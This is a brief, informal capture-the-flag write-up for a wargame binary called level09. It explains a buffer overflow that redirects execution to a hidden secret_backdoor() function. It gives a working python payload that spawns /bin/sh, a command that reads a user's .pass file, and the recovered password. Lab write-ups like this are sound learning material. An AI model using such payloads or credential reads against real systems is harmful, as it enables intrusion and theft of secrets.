This ones a combo of some prev levels.

we have an uncalled function secret_backdoor(), that calls fgets for stuff and the calls sytem presumably with the input

we need to use buff overflow to write this function's address just as we ve done before, the only difference really is 
the usage of strncpy which means we also need to fuck up the max len value during overflow (well just put the max value in corresponding address)

With pattern generator well find the required offset to write the address of secret_backdoor()
finally we'll add "bin/sh" as input for s_b()


(python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh"'; cat) | ./level09

cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
